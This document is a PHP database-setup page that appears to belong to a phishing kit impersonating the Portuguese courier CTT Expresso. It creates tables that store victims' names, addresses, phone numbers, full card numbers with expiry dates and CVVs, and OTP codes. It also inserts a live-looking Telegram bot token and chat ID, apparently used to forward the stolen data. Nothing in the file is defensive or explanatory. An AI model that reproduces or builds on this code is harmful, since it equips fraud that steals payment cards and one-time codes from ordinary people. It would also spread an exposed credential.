<?php
// Automatic database setup for local development
header('Content-Type: text/html; charset=UTF-8');
?>
<!DOCTYPE html>
<html>
<head>
    <title>CTT Expresso - Setup Database</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; background: #f5f5f5; }
        .container { max-width: 600px; margin: 0 auto; background: white; padding: 20px; border-radius: 8px; }
        .success { color: #28a745; font-weight: bold; }
        .error { color: #dc3545; font-weight: bold; }
        .info { color: #17a2b8; }
        .step { margin: 15px 0; padding: 10px; background: #f8f9fa; border-left: 4px solid #007bff; }
        button { padding: 10px 20px; background: #007bff; color: white; border: none; border-radius: 4px; cursor: pointer; }
        button:hover { background: #0056b3; }
        pre { background: #f8f9fa; padding: 10px; border-radius: 4px; overflow-x: auto; }
    </style>
</head>
<body>
    <div class="container">
        <h1>🚀 CTT Expresso Database Setup</h1>
        
        <?php
        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['setup'])) {
            echo "<h2>🔧 Setting up database...</h2>";
            
            // Try to setup database
            $configs = [
                ['host' => 'localhost', 'user' => 'root', 'pass' => '', 'port' => '3306', 'name' => 'XAMPP'],
                ['host' => 'localhost', 'user' => 'root', 'pass' => 'root', 'port' => '8889', 'name' => 'MAMP'],
                ['host' => 'localhost', 'user' => 'root', 'pass' => 'root', 'port' => '3306', 'name' => 'MAMP Alt'],
            ];
            
            $success = false;
            
            foreach ($configs as $config) {
                echo "<div class='step'>";
                echo "<strong>Trying {$config['name']} configuration...</strong><br>";
                
                try {
                    // Connect to MySQL (without database)
                    $dsn = "mysql:host={$config['host']};port={$config['port']};charset=utf8";
                    $pdo = new PDO($dsn, $config['user'], $config['pass'], [
                        PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION
                    ]);
                    
                    echo "<span class='info'>✓ Connected to MySQL</span><br>";
                    
                    // Create database
                    $pdo->exec("CREATE DATABASE IF NOT EXISTS ctt_expresso");
                    echo "<span class='info'>✓ Database 'ctt_expresso' created</span><br>";
                    
                    // Select database
                    $pdo->exec("USE ctt_expresso");
                    
                    // Create tables
                    $sql = "
                    CREATE TABLE IF NOT EXISTS billing_data (
                        id INT AUTO_INCREMENT PRIMARY KEY,
                        session_id VARCHAR(20) UNIQUE NOT NULL,
                        nome VARCHAR(255) NOT NULL,
                        email VARCHAR(255) NOT NULL,
                        endereco TEXT NOT NULL,
                        codigo_postal VARCHAR(20) NOT NULL,
                        cidade VARCHAR(100) NOT NULL,
                        telefone VARCHAR(20) NOT NULL,
                        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                    );
                    
                    CREATE TABLE IF NOT EXISTS card_data (
                        id INT AUTO_INCREMENT PRIMARY KEY,
                        session_id VARCHAR(20) NOT NULL,
                        numero_cartao VARCHAR(20) NOT NULL,
                        data_expiracao VARCHAR(10) NOT NULL,
                        cvv VARCHAR(4) NOT NULL,
                        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                    );
                    
                    CREATE TABLE IF NOT EXISTS otp_data (
                        id INT AUTO_INCREMENT PRIMARY KEY,
                        session_id VARCHAR(20) NOT NULL,
                        otp_code TEXT NOT NULL,
                        tracking_number VARCHAR(20) NOT NULL,
                        verified_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                    );
                    
                    CREATE TABLE IF NOT EXISTS config (
                        id INT AUTO_INCREMENT PRIMARY KEY,
                        config_key VARCHAR(100) UNIQUE NOT NULL,
                        config_value TEXT NOT NULL,
                        updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
                    );
                    ";
                    
                    $pdo->exec($sql);
                    echo "<span class='info'>✓ Tables created</span><br>";
                    
                    // Insert Telegram configuration
                    $stmt = $pdo->prepare("INSERT INTO config (config_key, config_value) VALUES (?, ?) ON DUPLICATE KEY UPDATE config_value = VALUES(config_value)");
                    $stmt->execute(['TELEGRAM_BOT_TOKEN', '8482443491:AAE2BLcm95hkizPLXXDVUXenHjamWd2qdws']);
                    $stmt->execute(['TELEGRAM_CHAT_ID', '-1003023517840']);
                    echo "<span class='info'>✓ Telegram configuration inserted</span><br>";
                    
                    echo "<span class='success'>✅ SUCCESS with {$config['name']}!</span>";
                    $success = true;
                    break;
                    
                } catch (Exception $e) {
                    echo "<span class='error'>❌ Failed: " . $e->getMessage() . "</span>";
                }
                echo "</div>";
            }
            
            if ($success) {
                echo "<div class='step success'>";
                echo "<h3>🎉 Database setup complete!</h3>";
                echo "<p><a href='test-connection.php'>Test Connection</a> | <a href='billing.php'>Start Application</a></p>";
                echo "</div>";
            } else {
                echo "<div class='step error'>";
                echo "<h3>❌ Setup failed</h3>";
                echo "<p>Please check that MySQL is running in XAMPP/MAMP</p>";
                echo "</div>";
            }
        } else {
        ?>
        
        <div class="step">
            <h2>📋 Before Setup:</h2>
            <ol>
                <li><strong>XAMPP Users:</strong> Start Apache & MySQL in XAMPP Control Panel</li>
                <li><strong>MAMP Users:</strong> Click "Start Servers" in MAMP</li>
                <li>Make sure MySQL is running (green light/status)</li>
            </ol>
        </div>
        
        <div class="step">
            <h2>🎯 What this will do:</h2>
            <ul>
                <li>✅ Create database: <code>ctt_expresso</code></li>
                <li>✅ Create all required tables</li>
                <li>✅ Insert Telegram configuration</li>
                <li>✅ Test connection automatically</li>
            </ul>
        </div>
        
        <form method="POST">
            <button type="submit" name="setup" style="font-size: 18px; padding: 15px 30px;">
                🚀 Setup Database Now
            </button>
        </form>
        
        <?php } ?>
        
        <div class="step">
            <h3>💡 Troubleshooting:</h3>
            <p><strong>If setup fails:</strong></p>
            <ul>
                <li>Make sure XAMPP/MAMP is running</li>
                <li>Check MySQL status is green/active</li>
                <li>Try restarting XAMPP/MAMP</li>
                <li>Check if port 3306 or 8889 is free</li>
            </ul>
        </div>
    </div>
</body>
</html>